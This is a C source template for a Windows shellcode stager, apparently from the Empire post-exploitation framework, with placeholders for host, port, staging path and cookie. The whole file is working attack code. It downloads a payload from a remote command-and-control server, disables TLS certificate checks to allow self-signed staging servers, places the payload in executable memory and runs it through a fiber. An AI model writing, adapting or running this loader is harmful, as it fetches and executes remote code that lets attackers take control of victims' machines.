#define _WIN32_WINNT 0x0501

#define UNICODE
#define _UNICODE
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <shellapi.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")

static void PrintLastError(const wchar_t* where);
static BOOL DownloadHostPathToBuffer(
    const wchar_t* host,
    WORD port,
    const wchar_t* path,
    BOOL useHttps,
    const wchar_t* cookieHeaderValue,
    BYTE** outBuf,
    DWORD* outLen
);

static BOOL ExecuteShellcode(const BYTE* data, DWORD len);
static void PrintLastError(const wchar_t* where)
{
    DWORD err = GetLastError();
}

static BOOL DownloadHostPathToBuffer(
    const wchar_t* host,
    WORD port,
    const wchar_t* path,
    BOOL useHttps,
    const wchar_t* cookieHeaderValue,
    BYTE** outBuf,
    DWORD* outLen
) {
    BOOL ok = FALSE;
    *outBuf = NULL;
    *outLen = 0;

    HINTERNET hSession = WinHttpOpen(L"WinHTTP Downloader/1.0",
                                     WINHTTP_ACCESS_TYPE_NO_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { PrintLastError(L"WinHttpOpen"); return FALSE; }

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD flags = useHttps ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            flags);
    if (!hRequest) { PrintLastError(L"WinHttpOpenRequest"); goto cleanup; }

    if (useHttps) {
        // Allow staging over HTTPS with self-signed/private CA certs (common in Empire setups).
        // This relaxes WinHTTP certificate validation for this request.
        DWORD securityFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if (!WinHttpSetOption(hRequest,
                              WINHTTP_OPTION_SECURITY_FLAGS,
                              &securityFlags,
                              sizeof(securityFlags))) {
            PrintLastError(L"WinHttpSetOption(WINHTTP_OPTION_SECURITY_FLAGS)");
            goto cleanup;
        }
    }

    wchar_t headerLine[4096];
    swprintf(headerLine, 4096, L"Cookie: %ls\r\n", cookieHeaderValue);

    if (!WinHttpAddRequestHeaders(hRequest, headerLine, (DWORD)-1,
                                  WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
        goto cleanup;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        goto cleanup;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        goto cleanup;
    }

    DWORD status = 0, statusSize = sizeof(status);
    if (!WinHttpQueryHeaders(hRequest,
                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX,
                             &status, &statusSize, WINHTTP_NO_HEADER_INDEX)) {
        goto cleanup;
    }

    if (status < 200 || status >= 300) {
        wchar_t reason[256];
        DWORD reasonSize = sizeof(reason);
        if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_TEXT,
                                WINHTTP_HEADER_NAME_BY_INDEX,
                                reason, &reasonSize, WINHTTP_NO_HEADER_INDEX)) {
        }
        goto cleanup;
    }

    BYTE* buf = NULL;
    DWORD cap = 0, len = 0;

    for (;;) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &avail)) {
            PrintLastError(L"WinHttpQueryDataAvailable");
            goto cleanup;
        }
        if (avail == 0) break;

        if (len + avail > cap) {
            DWORD newCap = (cap == 0) ? (avail * 2) : (cap * 2);
            while (newCap < len + avail) newCap *= 2;

            BYTE* nb = (BYTE*)realloc(buf, newCap);
            if (!nb) { wprintf(L"[!] realloc failed\n"); goto cleanup; }
            buf = nb;
            cap = newCap;
        }

        DWORD read = 0;
        if (!WinHttpReadData(hRequest, buf + len, avail, &read)) {
            PrintLastError(L"WinHttpReadData");
            goto cleanup;
        }
        len += read;
    }

    *outBuf = buf;
    *outLen = len;
    ok = TRUE;

cleanup:
    if (!ok && buf) free(buf);
    if (hRequest) WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok;
}

static BOOL ExecuteShellcode(const BYTE* data, DWORD len)
{
    // Allocate memory for shellcode
    void* execMem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        PrintLastError(L"VirtualAlloc");
        return FALSE;
    }

    // Copy shellcode
    memcpy(execMem, data, len);
    FlushInstructionCache(GetCurrentProcess(), execMem, len);

    // Convert current thread to fiber. We don't check for failure because if we're already a fiber, it's fine.
    // If it fails for other reasons, CreateFiber will likely fail too or SwitchToFiber will crash.
    void* mainFiber = ConvertThreadToFiber(NULL);

    // Create the fiber that will execute our shellcode
    void* shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
    if (!shellcodeFiber) {
        PrintLastError(L"CreateFiber");
        // Try to clean up if we converted to fiber? (Usually not necessary for main thread exit)
        return FALSE;
    }

    // Switch context to the shellcode. This will block this thread until/unless shellcode switches back.
    SwitchToFiber(shellcodeFiber);

    DeleteFiber(shellcodeFiber);
    return TRUE;
}

int main(int argc, char **argv); // forward declaration
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd)
{
    (void)hInst; (void)hPrev; (void)lpCmdLine; (void)nShowCmd;

    // Use standard Windows API to get argc/argv safely without CRT internal symbols
    int argc = 0;
    LPWSTR *argv_w = CommandLineToArgvW(GetCommandLineW(), &argc);

    // Convert wide argv to narrow argv for main compatibility
    // Note: This is a simplified conversion for stager purposes.
    char **argv = (char **)malloc(sizeof(char *) * (argc + 1));
    for (int i = 0; i < argc; i++) {
        int len = WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, NULL, 0, NULL, NULL);
        argv[i] = (char *)malloc(len);
        WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, argv[i], len, NULL, NULL);
    }
    argv[argc] = NULL;
    LocalFree(argv_w);

    int ret = main(argc, argv);
    for (int i = 0; i < argc; i++)
        free(argv[i]);
    free(argv);
    return ret;
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;

    const wchar_t* host = L"{{ host }}";
    WORD port = {{ port }};
    const wchar_t* path = L"{{ staging_path }}";
    BOOL useHttps = {{ use_https }};

    const wchar_t* cookie =
        L"{{ cookie }}";

    BYTE* data = NULL;
    DWORD size = 0;

    if (!DownloadHostPathToBuffer(host, port, path, useHttps, cookie, &data, &size)) {
        return 1;
    }

    if (!ExecuteShellcode(data, size)) {
        free(data);
        return 1;
    }
    free(data);

    return 0;
}
